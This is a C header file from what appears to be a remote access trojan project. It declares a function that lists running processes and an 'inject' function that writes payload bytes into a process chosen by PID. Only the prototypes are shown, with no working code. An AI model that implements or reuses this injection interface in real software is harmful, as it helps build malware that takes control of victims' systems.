#pragma once

#include "RAT-Exe-Main.h"

INT parseProcesses(__inout char*** procs, __inout char** procPIDs, __inout INT* numProcs);
INT inject(__in UINT32 PID, __in UINT64 payloadSize, VOID* payloadBytes);
